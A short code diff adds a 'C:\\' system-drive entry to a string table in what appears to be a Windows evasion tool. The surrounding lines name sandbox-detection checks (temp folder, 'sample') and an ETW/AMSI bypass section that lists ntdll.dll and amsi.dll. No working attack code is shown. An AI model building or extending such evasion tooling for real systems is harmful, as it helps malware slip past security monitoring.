@@ -242,6 +242,9 @@ STRINGS = [
     ("det_temp_sample", "\\sample"),
     ("det_temp_env", "TEMP"),
 
+    # === api.rs - system drive root ===
+    ("det_sys_drive", "C:\\"),
+
     # === bypass.rs - ETW / AMSI ===
     ("bypass_ntdll", "ntdll.dll"),
     ("bypass_amsi", "amsi.dll"),
